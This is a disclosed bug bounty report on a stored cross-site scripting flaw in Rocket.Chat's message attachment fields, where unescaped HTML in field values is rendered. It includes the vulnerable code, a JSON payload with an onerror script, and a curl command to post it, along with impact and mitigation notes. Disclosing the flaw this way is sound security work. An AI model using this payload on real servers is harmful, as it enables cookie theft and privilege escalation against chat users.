# XSS in message attachment fileds.

## Report Details
- **Report ID**: 899954
- **URL**: https://hackerone.com/reports/899954
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-06-16T21:19:49.402Z
- **Disclosed**: 2021-01-17T18:37:40.648Z

## Reporter
- **Username**: fabianfreyer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

**Summary:** There is a Cross-Site Scripting vulnerability in the message attachment fields.

**Description:**

If no custom renderer is set, the `specializedRendering` function will render any HTML provided in the `value` field of the attachment:

```js
	specializedRendering({ hash: { field, message } }) {
		let html = '';
		if (field.type && renderers[field.type]) {
			html = Blaze.toHTMLWithData(Template[renderers[field.type]], { field, message });
		} else {
			// consider the value already formatted as html
			html = field.value;
		}
		return `<div class="${ field.type }">${ html }</div>`;
	},
```

## Releases Affected:

  * Rocket.Chat up to 3.3.3

## Steps To Reproduce (from initial installation to vulnerability):

1. Get an Personal Access Token.
2. Create a channel "#cookies"
3. Invite administrators into "#cookies", e.g. by promising them yummy cookies.
4. Put the following payload in a file, calling it `cookiesplz.json`:

    ```
    {
        "channel": "#cookies",
        "text": "Hi, I'd like a cookie please",
        "attachments": [
            {
                "text": "ohai",
                "fields": [
                    {
                        "type": "hello from project pwner",
                        "title": "pwn",
                        "value": "test<img src=x onerror='alert(document.cookie);'/>",
                        "short": false
                    }
                ]
            }
        ]
    }
   ```

5. Run the following curl request: `curl -H "X-Auth-Token: <Token>" -H "X-User-Id: <user Id>" -H "Content-type:application/json" https://<server>/api/v1/chat.postMessage -d @cookiesplz.json`

## Supporting Material/References:

  * https://docs.rocket.chat/api/rest-api/methods/chat/postmessage#attachment-field-objects

## Suggested mitigation

  * Don't render verbatim HTML from user input.
  * Mitigate XSS using CSP headers.

## Impact

Using this vulnerability, an attacker can steal cookies of other users, including administrators to elevate their privileges. They can leak a user’s messages, critically impacting confidentiality. An attack payload may also Exit or delete messages, potentially removing traces of exploits and critically impacting integrity and availability. Finally, by escalating privileges, an attacker can restart the server and edit important settings, impacting availability. By using XSS execution, an attacker may send the payload to other users, i.e. this vulnerability is "wormable" on the same server.

In the electron client, this XSS can be used to get remote code execution.

## Attachments
No attachments
